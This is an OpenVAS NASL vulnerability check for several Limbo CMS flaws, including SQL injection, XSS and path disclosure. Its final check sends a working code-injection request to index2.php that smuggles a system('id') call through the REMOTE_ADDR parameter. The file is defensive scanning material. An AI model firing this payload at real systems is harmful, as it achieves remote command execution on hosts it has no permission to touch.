# OpenVAS Vulnerability Test
# $Id: limbo_multiple_flaws.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: Limbo CMS Multiple Vulnerabilities
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2006 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server contains a PHP application that is affected by
numerous vulnerabilities. 

Description :

The remote host is running Limbo CMS, a content-management system
written in PHP. 

The remote version of this software is vulnerable to several flaws
including :

-  If register_globals is off and Limbo is configured to use a MySQL 
   backend, then an SQL injection is possible due to improper 
   sanitization of the '_SERVER[REMOTE_ADDR]' parameter.
-  The installation path is revealed when the 'doc.inc.php', 
   'element.inc.php', and 'node.inc.php' files are reqeusted when 
   PHP's 'display_errors' setting is enabled.
-  An XSS attack is possible when the Stats module is used due to 
   improper sanitization of the '_SERVER[REMOTE_ADDR]' parameter.
-  Arbitrary PHP files can be retrieved via the 'index2.php' script 
   due to improper sanitation of the 'option' parameter.
-  An attacker can run arbitrary system commands on the remote 
   system via a combination of the SQL injection and directory 
   transversal attacks.";

tag_solution = "Apply the patch http://www.limbo-cms.com/downs/patch_1_0_4_2.zip";

if(description)
{
 script_id(20824);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_cve_id("CVE-2005-4317", "CVE-2005-4318", "CVE-2005-4319", "CVE-2005-4320");
 script_bugtraq_id(15871);
 script_xref(name:"OSVDB", value:"21753");
 script_xref(name:"OSVDB", value:"21754");
 script_xref(name:"OSVDB", value:"21755");
 script_xref(name:"OSVDB", value:"21756");
 script_xref(name:"OSVDB", value:"21757");
 script_xref(name:"OSVDB", value:"21758");
 script_xref(name:"OSVDB", value:"21759");
 
 name = "Limbo CMS Multiple Vulnerabilities";
 script_name(name);
 
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2006 Josh Zlatin-Amishav");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/419470");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

http_check_remote_code(
  extra_dirs:"",
  check_request:string("/index2.php?_SERVER[]=&_SERVER[REMOTE_ADDR]='.system('id').exit().'&option=wrapper&module[module]=1"),
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  port:port
);
